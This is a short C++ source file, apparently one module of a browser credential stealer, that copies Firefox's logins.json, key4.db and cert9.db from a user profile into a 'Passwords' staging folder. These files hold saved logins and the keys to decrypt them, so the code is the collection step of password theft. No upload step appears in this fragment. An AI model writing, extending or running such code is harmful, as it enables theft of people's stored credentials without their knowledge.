//
// Created by .1qxz on 10.06.2024.
//

#include "FPasswords.h"

void FPasswords::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path current_profile_path = this->withProfile(browser_root);

    for(std::string key : {"cert9.db", "key4.db", "logins.json"})
    {
        fs::path to_copy = current_profile_path / key;
        if(!exists(to_copy))
            continue;

        fs::create_directories(root / "Passwords" / this->getProfile());

        Utils::copyFile(to_copy, root / "Passwords" / this->getProfile() / key);
    }
}
